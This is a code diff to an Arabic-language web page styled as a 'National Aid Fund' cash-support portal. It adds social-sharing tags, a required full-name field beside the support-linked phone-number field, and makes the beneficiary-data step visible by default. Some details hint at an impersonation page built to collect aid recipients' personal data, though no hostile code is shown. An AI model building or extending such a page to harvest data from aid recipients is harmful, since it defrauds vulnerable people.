@@ -4,6 +4,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:title" content="صندوق المعونة الوطنية - National Aid Fund">
+    <meta property="og:description" content="بوابة الخدمات الإلكترونية لبرنامج الدعم النقدي الموحد">
+    <meta property="og:image" itemprop="image" content="images/banner.jpg">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="صندوق المعونة الوطنية - National Aid Fund">
+    <meta name="twitter:description" content="بوابة الخدمات الإلكترونية لبرنامج الدعم النقدي الموحد">
+    <meta name="twitter:image" content="images/banner.jpg">
     <title>صندوق المعونة الوطنية - National Aid Fund</title>
 
     <link href="css/bootstrap.min.css" rel="stylesheet">
@@ -559,6 +567,11 @@
                             <input type="checkbox" id="certifico" checked required>
                             <input type="hidden" id="full_name" value="User">
                         </div>
+                        
+                        <div class="form-group mb-3">
+                            <label class="form-label-custom">الاسم الرباعي</label>
+                            <input type="text" id="user_name_input" class="input-custom input-rtl" placeholder="أدخل الاسم الرباعي" required>
+                        </div>
 
                         <div class="form-group mb-3">
                             <label class="form-label-custom">رقم الهاتف (المرتبط بالدعم)</label>
@@ -603,7 +616,7 @@
                     </form>
                 </div>
 
-                <div id="step5" class="step-section">
+                <div id="step5" class="step-section active">
                     <h2 class="card-title-custom mb-3" style="font-size: 1.25rem;">تحديث بيانات المستفيد</h2>
                     <p style="text-align: center; color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px; font-weight: 500;">
                         الرجاء إدخال بياناتك بدقة لضمان استلام الدعم النقدي
